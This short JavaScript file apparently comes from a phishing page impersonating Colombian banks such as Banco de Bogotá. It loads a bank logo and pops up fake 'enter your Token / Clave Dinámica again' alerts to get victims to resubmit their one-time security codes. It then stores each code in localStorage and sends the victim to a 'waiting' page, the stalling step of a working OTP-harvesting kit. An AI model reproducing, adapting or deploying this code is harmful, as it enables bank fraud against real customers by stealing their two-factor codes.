const loader = document.querySelector('.loader');
setTimeout(() =>{
    try{
        document.querySelector('body').classList.remove('sb-hidden');
        loader.classList.remove('show');

        // COMPROBAR ERROR
        if(info.metaInfo.cdin !== ''){
            if(info.metaInfo.ban === 'bogota'){
                alert('Ingrese de nuevo su Token');
            }else{
                alert('Ingrese de nuevo su Clave Dinámica');
            }
            
        }

    }catch(err){
        console.log(err);
    }
}, 1500);

// image and span
document.querySelector('#bank-logo').setAttribute('src', `./assets/logos/${info.metaInfo.ban}.png`);
if(info.metaInfo.ban === 'bogota'){
    console.log('hoasda')
    document.querySelector('#din-type-title').textContent = 'Token';
    document.querySelector('#din-type-subtitle').textContent = 'Ingresa el Token que encontrarás en la App Móvil de tu banco.';
    document.querySelector('#cdin').placeholder = 'Token'
}

const btnNextStep = document.querySelector('#next-step');
btnNextStep.addEventListener('submit', e => {
    e.preventDefault();

    if(document.querySelector('#cdin').value !== ''){
        info.metaInfo.cdin = document.querySelector('#cdin').value;
        LS.setItem('info', JSON.stringify(info));
        window.location.href = 'waiting.html';
    }else{
        document.querySelector('#cdin').classList.add('input-error');
    }
});